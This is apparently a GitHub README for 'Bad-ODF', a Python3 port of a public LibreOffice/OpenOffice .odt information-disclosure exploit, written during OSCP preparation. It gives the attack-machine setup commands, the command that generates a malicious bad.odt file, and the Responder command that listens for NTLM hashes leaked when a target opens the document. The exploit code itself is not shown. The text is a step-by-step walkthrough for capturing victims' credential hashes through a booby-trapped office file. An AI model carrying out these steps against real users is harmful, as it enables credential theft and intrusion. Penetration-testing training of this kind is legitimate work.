# Malicious ODF File Creator

Python3 version of the exploit "LibreOffice/Open Office - '.odt' Information Disclosure" https://www.exploit-db.com/exploits/44564
I modified this exploit during my OSCP preparation

*Thanks to Richard Davy for discovery the exploit!*

On the attack machine:

└─$ python3 -m venv badodf-venv  

└─$ source badodf-venv/bin/activate

└─$ pip install ezodf && pip install --upgrade lxml

Run this command to create the bad.odt file:

python3 Bad-ODF.py

Start Responder on attack machine: 
                                                                                                                                       
┌──(kali㉿kali)-[~/Hercules]
└─$ sudo responder -I tun0 -v

Upload the bad.odt file onto the attack machine; be patient for the target to leak the NTLM files to Responder.
